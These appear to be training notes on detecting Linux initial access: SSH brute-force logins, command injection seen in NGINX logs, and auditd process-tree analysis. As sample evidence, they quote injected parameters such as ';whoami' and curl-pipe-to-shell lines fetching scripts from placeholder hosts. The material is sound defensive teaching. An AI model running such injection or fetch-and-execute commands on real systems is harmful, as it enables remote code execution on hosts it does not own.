# 🧠 Linux Initial Access & SSH Attack Detection

---

## 🔓 Common Real-World Scenario

Imagine this:
An IT administrator enables **public SSH access** to the server, allows **password-based authentication**, and sets a **weak password** for one of the support users.

These three actions almost **guarantee** an SSH breach — it’s only a matter of time before threat actors guess the password.

A log sample below shows such a compromise: a **brute force** followed by a **password breach**.

There are three indicators of malicious logins to pay attention to:

<img width="1383" height="297" alt="image" src="https://github.com/user-attachments/assets/bb14a60c-10d4-478d-9005-e71bd2412470" />


---

## 🕵️ Detecting SSH Attacks

On Linux, analyzing authentication logs is simpler — you don’t need to memorize a dozen fields.

Start by **listing all successful SSH logins** and analyzing a few key fields.

Imagine you’ve queried the logs and found three successful SSH logins — how do you distinguish **legitimate** from **malicious**?

<img width="1387" height="186" alt="image" src="https://github.com/user-attachments/assets/4507e25b-8eb1-46e2-a296-b41a5b13e8bd" />


---

### ✅ Login of Ansible

The first login appears legitimate:

* Used **public-key authentication**
* Originated from an **internal IP**
* Occurred at **exactly 14:00**, suggesting an automation task

Still, confirm that `10.14.105.255` is indeed your **Ansible server**, and review the user’s actions to ensure no compromise.

---

### ⚠️ Logins of Jsmith

The two `jsmith` logins raise **three red flags**:

1. Password-based authentication
2. External IP addresses
3. Suspicious time difference between logins (possibly during off-hours)

Further investigation steps:

* **Username**: Who owns the account? Is the timing and IP expected?
* **Source IP**: Check with [Threat Intel tools](https://tryhackme.com/room/ipanddomainthreatintel) or [Asset lookups](https://tryhackme.com/room/socworkbookslookups)
* **Login history**: Was this preceded by brute force attempts?
* **Next steps**: Should you trace user actions post-login?

---

## ⚙️ Initial Access via Services

### 🧩 Linux and Public Services

Linux systems often host **public-facing applications** — web servers, mail servers, databases, or management tools.
Compromising one service often means compromising the entire host.

This risk aligns with [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).

**Examples:**

* [CVE in Zimbra Collaboration](https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html): Remote command execution
* [Exposed Docker API Port](https://www.aquasec.com/blog/threat-alert-teamtnts-docker-gatling-gun-campaign/#:~:text=The%20campaign%20gains%20initial%20access%20by%20exploiting%20exposed%20Docker%20daemons): Entry point for cloud breaches
* [CVE in Palo Alto Firewalls](https://unit42.paloaltonetworks.com/cve-2024-3400/): Full system compromise
* [WordPress Plugin Abuse](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/): Web shell upload exploitation

---

## 🧾 Using Application Logs

While application logs rarely state “I’m being exploited,” they can still **reveal key artifacts**.

Examples:

* **Web logs** → Detect web-based attacks
* **Database logs** → Spot malicious SQL queries
* **VPN logs** → Find abnormal VPN logins
* **Specialized logs** → Track sensitive actions (e.g., bank transactions)

---

## 🌐 Web as Initial Access

A vulnerable web app can be the easiest entry point.

Example:
The IT team creates a simple app called **TryPingMe** that runs:

```bash
ping -c 2 [YOUR-INPUT]
```

Without input validation, attackers can exploit **command injection**.

### 🔍 NGINX Access Logs

```bash
ubuntu@thm-vm:~$ cat /var/log/nginx/access.log
10.2.33.10 - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]
10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

### 🧩 Web Log Analysis

Indicators of compromise:

* IP `10.14.105.255` is likely the attacker
* `/ping` endpoint is **vulnerable to command injection**
* Commands executed: `whoami`, `ls`
* The entire system is **at risk**

---

## 🪴 Detecting Service Breach

### 🧱 Building a Process Tree

When app logs are insufficient, **process tree analysis** reveals the attack path.

See: [Wiz Process Tree Example](https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps#:~:text=Below%20is%20the%20exploit%20process%20tree%3A%C2%A0)

<img width="1387" height="407" alt="image" src="https://github.com/user-attachments/assets/cc862c79-5599-4ef9-9fdf-d1040229a477" />


### 📋 Using Auditd to Reconstruct the Tree

```bash
# Find the suspicious command
ausearch -i -x whoami

# Walk up the process tree
ausearch -i --pid 3905
ausearch -i --pid 3898
```

**Sample Output**

```bash
type=PROCTITLE : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
exe=/usr/bin/python3.12 key=exec
```

→ `whoami` was executed by a **Python web app**, suggesting a possible **service breach**.

---

### 🔎 Searching for Child Processes

```bash
ausearch -i --ppid 3898 | grep 'proctitle'
type=PROCTITLE : proctitle=/bin/sh -c whoami
type=PROCTITLE : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
```

This reveals that the attacker used the web app to execute a malicious script — confirming exploitation.

---

## 🧑‍💻 Advanced Initial Access

### 🧍 Human-Led Attacks

| Scenario Example                                                                    | Consequence                                                                                                               |                                                                                                                                         |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| IT member runs `curl [https://shadyforum.thm/fix.sh](https://shadyforum.thm/fix.sh) | bash` from a forum                                                                                                        | Installs hidden malware ([Read more](https://www.schneier.com/blog/archives/2022/11/an-untrustworthy-tls-certificate-in-browsers.html)) |
| Developer mistypes `pip3 install fastpi` instead of `fastapi`                       | Installs malicious PyPI package ([Real case](https://thehackernews.com/2025/03/malicious-pypi-packages-stole-cloud.html)) |                                                                                                                                         |

---

### 🧰 Supply Chain Compromise

See: [MITRE ATT&CK T1195](https://attack.mitre.org/techniques/T1195/)

Examples:

* [XZ Utils Backdoor](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) — nearly compromised millions of SSH servers
* [tj-actions Breach](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) — leaked thousands of SSH keys and tokens

---

## 🧩 Detecting the Attacks

<img width="1388" height="292" alt="image" src="https://github.com/user-attachments/assets/a4127209-e43f-46b9-a1ed-dfc659304f19" />


---

### 💡 Summary

* Weak SSH configurations = easy entry
* Analyze successful logins first
* Watch for abnormal web and process activity
* Always validate app behavior and dependencies


